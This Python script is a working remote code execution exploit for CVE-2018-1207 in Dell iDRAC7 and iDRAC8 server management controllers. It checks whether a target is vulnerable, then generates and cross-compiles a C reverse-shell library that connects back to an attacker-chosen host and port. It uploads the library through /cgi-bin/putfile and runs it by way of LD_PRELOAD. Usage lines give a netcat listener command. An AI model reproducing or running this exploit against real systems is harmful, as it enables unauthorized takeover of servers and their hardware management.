#!/usr/bin/python

# Exploit Title: Dell iDRAC7 and iDRAC8 Devices Code Injection Vulnerability (RCE)
# Vulnerable version firmware: <  2.52.52.52
# Date: 2018-09-06
# Vendor Homepage: https://www.dell.com
# CVE number: CVE-2018-1207
# By: Starev Alexey ( https://t.me/starev_aa ), http://kraud.ru

import requests
import sys
import os
import re
import struct
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

current_version = sys.version_info.major
if current_version != 2:
    print('This script must be run with Python version 2.x')
    exit()

print ("""
    _   ________  ___  _   _______ 
   | | / /| ___ \/ _ \| | | |  _  \\
   | |/ / | |_/ / /_\ \ | | | | | |
   |    \ |    /|  _  | | | | | | |
   | |\  \| |\ \| | | | |_| | |/ / 
   \_| \_/\_| \_\_| |_/\___/|___/  

                   https://kraud.ru                  
""")

try:
    host = sys.argv[1:][0]
    port = sys.argv[1:][1]
    lhost = sys.argv[1:][2]
    lport = sys.argv[1:][3]
except:
    print ("Usage: python ./CVE-2018-1207.py <rhost> <rport> <lhost> <lport>   ")
    print ("       python ./CVE-2018-1207.py 192.168.1.31 443 93.189.145.82 4444")
    print ("       nc -v -l -p <lport>                                         ")
    exit()

payloadbin = 'payload.so'
payloadc = 'payload.c'
timeout = 10
url = 'https://'+ str(host) + ':'+str(port)

try:
    r = requests.get(url+'/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=timeout)
except:
  print ("An error connecting to the server " + str(url))
  exit()

vul  = re.search(r'calling init: /lib/',r.text)
if vul :
    print('[+] Server ' + str(url) + ' is vulnerable')
else:
    print('[-] Server ' + str(url) + ' is not vulnerable')
    exit()

print ("Generate Payload")

if os.path.exists(payloadc):
    os.unlink(payloadc)

payload = ("""
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
static void main(void) __attribute__((constructor));
static void main(void)
{
       int pid = fork();
       if(!pid) {
		int sock = socket(AF_INET, SOCK_STREAM, 0);
		struct sockaddr_in serv_addr = {0};
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(%d);
		serv_addr.sin_addr.s_addr = inet_addr("%s");
		connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		execl("/bin/sh", "/bin/sh", NULL);
	}
}
""") % (int(lport), lhost)

with open(payloadc, 'w') as file:
    file.write(payload)

if os.path.exists(payloadc):
    cmd = os.system('sh4-linux-gnu-gcc-7 -shared -fPIC ./payload.c -o ./payload.so')
    exit_code = os.WEXITSTATUS(cmd)
    if exit_code == 0:
        print ("[+] Generated payload.")
    else:
        print ("[!] Error generate payload. Need the package gcc-7-sh4-linux-gnu (apt-get install gcc-7-sh4-linux-gnu).")
        exit()
else:
    print ("[!] Error generate payload. Please check the permissions and owner of that directory.")
    exit()

FFLAGS = 1
f = open(payloadbin)
payload_so = f.read()
f.close()

res = ''
f_alias = 'RACPKSSHAUTHKEY1'
res += f_alias + (32 - len(f_alias))*'\0'
res += struct.pack('<L', len(payload_so))
res += struct.pack('<L', FFLAGS)
res += payload_so

print ("Upload payload")
r = requests.post(url+'/cgi-bin/putfile', data=res, verify=False, timeout=timeout)

if r.status_code == 200:
    print ("[+] OK")
else:
    print ("Failed upload Payload")
    exit()

print ("Start shell.")
r = requests.get(url+'/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp', verify=False, timeout=timeout)
#print r.text
print ("Good luck!")

if os.path.exists(payloadc):
    os.unlink(payloadc)

if os.path.exists(payloadbin):
    os.unlink(payloadbin)
